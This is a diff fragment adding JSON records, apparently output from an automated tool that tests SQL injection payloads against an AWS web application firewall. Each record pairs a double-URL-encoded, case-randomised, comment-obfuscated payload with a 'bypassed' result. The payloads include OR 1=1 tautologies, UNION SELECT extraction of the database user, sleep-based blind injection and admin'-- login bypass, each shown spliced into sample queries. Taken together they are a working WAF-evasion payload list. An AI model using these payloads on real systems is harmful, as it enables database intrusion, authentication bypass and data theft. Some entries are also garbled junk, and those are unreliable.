+            "payload": "1&id=ADmiN'/**/--",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1&id=ADmiN'/**/--'"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE email = '1&id=ADmiN'/**/--' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = 1&id=ADmiN'/**/--",
+                "SELECT * FROM orders WHERE amount > 1&id=ADmiN'/**/-- AND active = 1",
+                "SELECT * FROM users LIMIT 1&id=ADmiN'/**/--",
+                "SELECT * FROM products LIMIT 10 OFFSET 1&id=ADmiN'/**/--",
+                "SELECT * FROM orders LIMIT 1&id=ADmiN'/**/-- OFFSET 0",
+                "SELECT * FROM users ORDER BY 1&id=ADmiN'/**/--",
+                "SELECT * FROM users ORDER BY 1&id=ADmiN'/**/-- DESC",
+                "SELECT * FROM 1&id=ADmiN'/**/-- WHERE active = 1",
+                "SELECT * FROM users WHERE 1&id=ADmiN'/**/-- IS NOT NULL",
+                "SELECT 1&id=ADmiN'/**/-- FROM users",
+                "SELECT * FROM users ORDER BY id 1&id=ADmiN'/**/--"
+            ]
+        }
+    },
+    {
+        "payload": "1%2520/*!OR*/%25201%253D1",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "1 /*!OR*/ 1=1",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1 /*!OR*/ 1=1'",
+                "SELECT * FROM users WHERE email = '1 /*!OR*/ 1=1' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = 1 /*!OR*/ 1=1",
+                "SELECT * FROM orders WHERE amount > 1 /*!OR*/ 1=1 AND active = 1",
+                "SELECT * FROM users LIMIT 1 /*!OR*/ 1=1",
+                "SELECT * FROM products LIMIT 10 OFFSET 1 /*!OR*/ 1=1",
+                "SELECT * FROM orders LIMIT 1 /*!OR*/ 1=1 OFFSET 0",
+                "SELECT * FROM users ORDER BY 1 /*!OR*/ 1=1",
+                "SELECT * FROM users ORDER BY 1 /*!OR*/ 1=1 DESC",
+                "SELECT * FROM 1 /*!OR*/ 1=1 WHERE active = 1",
+                "SELECT * FROM users WHERE 1 /*!OR*/ 1=1 IS NOT NULL",
+                "SELECT 1 /*!OR*/ 1=1 FROM users",
+                "SELECT * FROM users ORDER BY id 1 /*!OR*/ 1=1"
+            ]
+        }
+    },
+    {
+        "payload": "ADmiN%2527%252b--",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "ADmiN'+--",
+            "safe_queries": [],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE username = 'ADmiN'+--'",
+                "SELECT * FROM users WHERE email = 'ADmiN'+--' AND active = 1",
+                "SELECT * FROM users WHERE id = ADmiN'+--",
+                "SELECT * FROM orders WHERE amount > ADmiN'+-- AND active = 1",
+                "SELECT * FROM users LIMIT ADmiN'+--",
+                "SELECT * FROM products LIMIT 10 OFFSET ADmiN'+--",
+                "SELECT * FROM orders LIMIT ADmiN'+-- OFFSET 0",
+                "SELECT * FROM users ORDER BY ADmiN'+--",
+                "SELECT * FROM users ORDER BY ADmiN'+-- DESC",
+                "SELECT * FROM ADmiN'+-- WHERE active = 1",
+                "SELECT * FROM users WHERE ADmiN'+-- IS NOT NULL",
+                "SELECT ADmiN'+-- FROM users",
+                "SELECT * FROM users ORDER BY id ADmiN'+--"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520OR%25201%253D1--stateProviderRegistrationName_%2548%2549%256B%256F%256E%257A%255C----------------------^__sblc%2540HpMl%2540Mweb/indexSearchNew.php?szsFile=yTJY%2540NccJ",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Boolean-based Blind_full_bypass+Time-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ'",
+                "SELECT * FROM users WHERE email = '' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ",
+                "SELECT * FROM orders WHERE amount > ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ AND active = 1",
+                "SELECT * FROM users LIMIT ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ",
+                "SELECT * FROM orders LIMIT ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ OFFSET 0",
+                "SELECT * FROM users ORDER BY ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ",
+                "SELECT * FROM users ORDER BY ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ DESC",
+                "SELECT * FROM ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ WHERE active = 1",
+                "SELECT * FROM users WHERE ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ IS NOT NULL",
+                "SELECT ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ FROM users",
+                "SELECT * FROM users ORDER BY id ' OR 1=1--stateProviderRegistrationName_HIkonz\\----------------------^__sblc%4OHpMl%4OMweb/indexSearchNew.php?szsFile=yTJY%4ONccJ"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520ANd%2520%2528/%252a%2521sElEcT%252A/%25201%2520FrOM%2520%2528/%252A%2521SELect%252A/%2528slEep%25285%2529%2529%2529a%2529--%2520",
+        "technique": "Time-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- ",
+            "safe_queries": [],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE username = '' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- '",
+                "SELECT * FROM users WHERE email = '' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- ' AND active = 1",
+                "SELECT * FROM users WHERE id = ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- ",
+                "SELECT * FROM orders WHERE amount > ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- ",
+                "SELECT * FROM orders LIMIT ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- ",
+                "SELECT * FROM users ORDER BY ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)--  DESC",
+                "SELECT * FROM ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)--  IS NOT NULL",
+                "SELECT ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' ANd (/*!sElEcT*/ 1 FrOM (/*!SELect*/(slEep(5)))a)-- "
+            ]
+        }
+    },
+    {
+        "payload": "%25ef%25bd%2581d%253D%2527aDMIn%252F%252A%2521--",
+        "technique": "Boolean-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "ad='aDMIn/*!--",
+            "safe_queries": [],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE username = 'ad='aDMIn/*!--'",
+                "SELECT * FROM users WHERE email = 'ad='aDMIn/*!--' AND active = 1",
+                "SELECT * FROM users WHERE id = ad='aDMIn/*!--",
+                "SELECT * FROM orders WHERE amount > ad='aDMIn/*!-- AND active = 1",
+                "SELECT * FROM users LIMIT ad='aDMIn/*!--",
+                "SELECT * FROM products LIMIT 10 OFFSET ad='aDMIn/*!--",
+                "SELECT * FROM orders LIMIT ad='aDMIn/*!-- OFFSET 0",
+                "SELECT * FROM users ORDER BY ad='aDMIn/*!--",
+                "SELECT * FROM users ORDER BY ad='aDMIn/*!-- DESC",
+                "SELECT * FROM ad='aDMIn/*!-- WHERE active = 1",
+                "SELECT * FROM users WHERE ad='aDMIn/*!-- IS NOT NULL",
+                "SELECT ad='aDMIn/*!-- FROM users",
+                "SELECT * FROM users ORDER BY id ad='aDMIn/*!--"
+            ]
+        }
+    },
+    {
+        "payload": "ADmiN%2527%252509--",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "ADmiN'\t--",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = 'ADmiN'\t--'"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE email = 'ADmiN'\t--' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ADmiN'\t--",
+                "SELECT * FROM orders WHERE amount > ADmiN'\t-- AND active = 1",
+                "SELECT * FROM users LIMIT ADmiN'\t--",
+                "SELECT * FROM products LIMIT 10 OFFSET ADmiN'\t--",
+                "SELECT * FROM orders LIMIT ADmiN'\t-- OFFSET 0",
+                "SELECT * FROM users ORDER BY ADmiN'\t--",
+                "SELECT * FROM users ORDER BY ADmiN'\t-- DESC",
+                "SELECT * FROM ADmiN'\t-- WHERE active = 1",
+                "SELECT * FROM users WHERE ADmiN'\t-- IS NOT NULL",
+                "SELECT ADmiN'\t-- FROM users",
+                "SELECT * FROM users ORDER BY id ADmiN'\t--"
+            ]
+        }
+    },
+    {
+        "payload": "1%2520oR%25201%253d1",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "1 oR 1=1",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1 oR 1=1'",
+                "SELECT * FROM users WHERE email = '1 oR 1=1' AND active = 1"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE id = 1 oR 1=1",
+                "SELECT * FROM orders WHERE amount > 1 oR 1=1 AND active = 1",
+                "SELECT * FROM users ORDER BY 1 oR 1=1",
+                "SELECT * FROM users ORDER BY 1 oR 1=1 DESC",
+                "SELECT * FROM users WHERE 1 oR 1=1 IS NOT NULL",
+                "SELECT 1 oR 1=1 FROM users"
+            ],
+            "error_queries": [
+                "SELECT * FROM users LIMIT 1 oR 1=1",
+                "SELECT * FROM products LIMIT 10 OFFSET 1 oR 1=1",
+                "SELECT * FROM orders LIMIT 1 oR 1=1 OFFSET 0",
+                "SELECT * FROM 1 oR 1=1 WHERE active = 1",
+                "SELECT * FROM users ORDER BY id 1 oR 1=1"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' uNiON SELect 1,User(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' uNiON SELect 1,User(),3-- '",
+                "SELECT * FROM users WHERE email = '' uNiON SELect 1,User(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' uNiON SELect 1,User(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM orders LIMIT ' uNiON SELect 1,User(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM users ORDER BY ' uNiON SELect 1,User(),3--  DESC",
+                "SELECT * FROM ' uNiON SELect 1,User(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' uNiON SELect 1,User(),3--  IS NOT NULL",
+                "SELECT ' uNiON SELect 1,User(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' uNiON SELect 1,User(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "%252527/%25252A%25252a/UNiOn/%25252aA%25252a/SElecT/%25252A%25252A/1%25252cUser%252528%252529%25252C3--/%25252A%25252a/",
+        "technique": "Time-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "'/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = ''/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/'",
+                "SELECT * FROM users WHERE email = ''/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/",
+                "SELECT * FROM orders WHERE amount > '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/ AND active = 1",
+                "SELECT * FROM users LIMIT '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/",
+                "SELECT * FROM products LIMIT 10 OFFSET '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/",
+                "SELECT * FROM orders LIMIT '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/ OFFSET 0",
+                "SELECT * FROM users ORDER BY '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/",
+                "SELECT * FROM users ORDER BY '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/ DESC",
+                "SELECT * FROM '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/ WHERE active = 1",
+                "SELECT * FROM users WHERE '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/ IS NOT NULL",
+                "SELECT '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/ FROM users",
+                "SELECT * FROM users ORDER BY id '/**/UNiOn/*A*/SElecT/**/1,User(),3--/**/"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' uNiON SELect 1,User(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' uNiON SELect 1,User(),3-- '",
+                "SELECT * FROM users WHERE email = '' uNiON SELect 1,User(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' uNiON SELect 1,User(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM orders LIMIT ' uNiON SELect 1,User(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM users ORDER BY ' uNiON SELect 1,User(),3--  DESC",
+                "SELECT * FROM ' uNiON SELect 1,User(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' uNiON SELect 1,User(),3--  IS NOT NULL",
+                "SELECT ' uNiON SELect 1,User(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' uNiON SELect 1,User(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "1%2526OR%253D1 /*8*/ -- 70",
+        "technique": "Boolean-based Blind_full_bypass+Time-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "1&OR=1 /*8*/ -- 7O",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1&OR=1 /*8*/ -- 7O'",
+                "SELECT * FROM users WHERE email = '1&OR=1 /*8*/ -- 7O' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = 1&OR=1 /*8*/ -- 7O",
+                "SELECT * FROM orders WHERE amount > 1&OR=1 /*8*/ -- 7O AND active = 1",
+                "SELECT * FROM users LIMIT 1&OR=1 /*8*/ -- 7O",
+                "SELECT * FROM products LIMIT 10 OFFSET 1&OR=1 /*8*/ -- 7O",
+                "SELECT * FROM orders LIMIT 1&OR=1 /*8*/ -- 7O OFFSET 0",
+                "SELECT * FROM users ORDER BY 1&OR=1 /*8*/ -- 7O",
+                "SELECT * FROM users ORDER BY 1&OR=1 /*8*/ -- 7O DESC",
+                "SELECT * FROM 1&OR=1 /*8*/ -- 7O WHERE active = 1",
+                "SELECT * FROM users WHERE 1&OR=1 /*8*/ -- 7O IS NOT NULL",
+                "SELECT 1&OR=1 /*8*/ -- 7O FROM users",
+                "SELECT * FROM users ORDER BY id 1&OR=1 /*8*/ -- 7O"
+            ]
+        }
+    },
+    {
+        "payload": "%2527/%252A%252a/uNIOn/%252a%252a/seLeCt/%252A%252A/1%252CUser%2528%2529%252c3--/%252a%252A/",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "'/**/uNIOn/**/seLeCt/**/1,User(),3--/**/",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = ''/**/uNIOn/**/seLeCt/**/1,User(),3--/**/'",
+                "SELECT * FROM users WHERE email = ''/**/uNIOn/**/seLeCt/**/1,User(),3--/**/' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/",
+                "SELECT * FROM orders WHERE amount > '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/ AND active = 1",
+                "SELECT * FROM users LIMIT '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/",
+                "SELECT * FROM products LIMIT 10 OFFSET '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/",
+                "SELECT * FROM orders LIMIT '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/ OFFSET 0",
+                "SELECT * FROM users ORDER BY '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/",
+                "SELECT * FROM users ORDER BY '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/ DESC",
+                "SELECT * FROM '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/ WHERE active = 1",
+                "SELECT * FROM users WHERE '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/ IS NOT NULL",
+                "SELECT '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/ FROM users",
+                "SELECT * FROM users ORDER BY id '/**/uNIOn/**/seLeCt/**/1,User(),3--/**/"
+            ]
+        }
+    },
+    {
+        "payload": "%253Furl_%2520hour%253D1%2520and%2520month%253D7%252e08%2526amp%253Fid%253Djunk%252farkporterror",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "?url_ hour=1 and month=7.O8&?id=junk/arkporterror",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '?url_ hour=1 and month=7.O8&?id=junk/arkporterror'",
+                "SELECT * FROM users WHERE email = '?url_ hour=1 and month=7.O8&?id=junk/arkporterror' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ?url_ hour=1 and month=7.O8&?id=junk/arkporterror",
+                "SELECT * FROM orders WHERE amount > ?url_ hour=1 and month=7.O8&?id=junk/arkporterror AND active = 1",
+                "SELECT * FROM users LIMIT ?url_ hour=1 and month=7.O8&?id=junk/arkporterror",
+                "SELECT * FROM products LIMIT 10 OFFSET ?url_ hour=1 and month=7.O8&?id=junk/arkporterror",
+                "SELECT * FROM orders LIMIT ?url_ hour=1 and month=7.O8&?id=junk/arkporterror OFFSET 0",
+                "SELECT * FROM users ORDER BY ?url_ hour=1 and month=7.O8&?id=junk/arkporterror",
+                "SELECT * FROM users ORDER BY ?url_ hour=1 and month=7.O8&?id=junk/arkporterror DESC",
+                "SELECT * FROM ?url_ hour=1 and month=7.O8&?id=junk/arkporterror WHERE active = 1",
+                "SELECT * FROM users WHERE ?url_ hour=1 and month=7.O8&?id=junk/arkporterror IS NOT NULL",
+                "SELECT ?url_ hour=1 and month=7.O8&?id=junk/arkporterror FROM users",
+                "SELECT * FROM users ORDER BY id ?url_ hour=1 and month=7.O8&?id=junk/arkporterror"
+            ]
+        }
+    },
+    {
+        "payload": "%252527%252520and%252520%252528select%2525201%252520from%252520%252528select%252528sleep%2525285%252529%252529%252529A%252529--%252520",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' and (select 1 from (select(sleep(5)))A)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' and (select 1 from (select(sleep(5)))A)-- '",
+                "SELECT * FROM users WHERE email = '' and (select 1 from (select(sleep(5)))A)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders WHERE amount > ' and (select 1 from (select(sleep(5)))A)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders LIMIT ' and (select 1 from (select(sleep(5)))A)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)--  DESC",
+                "SELECT * FROM ' and (select 1 from (select(sleep(5)))A)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' and (select 1 from (select(sleep(5)))A)--  IS NOT NULL",
+                "SELECT ' and (select 1 from (select(sleep(5)))A)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' and (select 1 from (select(sleep(5)))A)-- "
+            ]
+        }
+    },
+    {
+        "payload": "AdMin%2527%2520--",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "AdMin' --",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = 'AdMin' --'"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE email = 'AdMin' --' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = AdMin' --",
+                "SELECT * FROM orders WHERE amount > AdMin' -- AND active = 1",
+                "SELECT * FROM users LIMIT AdMin' --",
+                "SELECT * FROM products LIMIT 10 OFFSET AdMin' --",
+                "SELECT * FROM orders LIMIT AdMin' -- OFFSET 0",
+                "SELECT * FROM users ORDER BY AdMin' --",
+                "SELECT * FROM users ORDER BY AdMin' -- DESC",
+                "SELECT * FROM AdMin' -- WHERE active = 1",
+                "SELECT * FROM users WHERE AdMin' -- IS NOT NULL",
+                "SELECT AdMin' -- FROM users",
+                "SELECT * FROM users ORDER BY id AdMin' --"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520ANd%2520%2528SElEcT%25201%2520frOM%2520%2528selECT%2528slEEP%25285%2529%2529%2529a%2529--%2520",
+        "technique": "Boolean-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- '",
+                "SELECT * FROM users WHERE email = '' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- ",
+                "SELECT * FROM orders WHERE amount > ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- ",
+                "SELECT * FROM orders LIMIT ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- ",
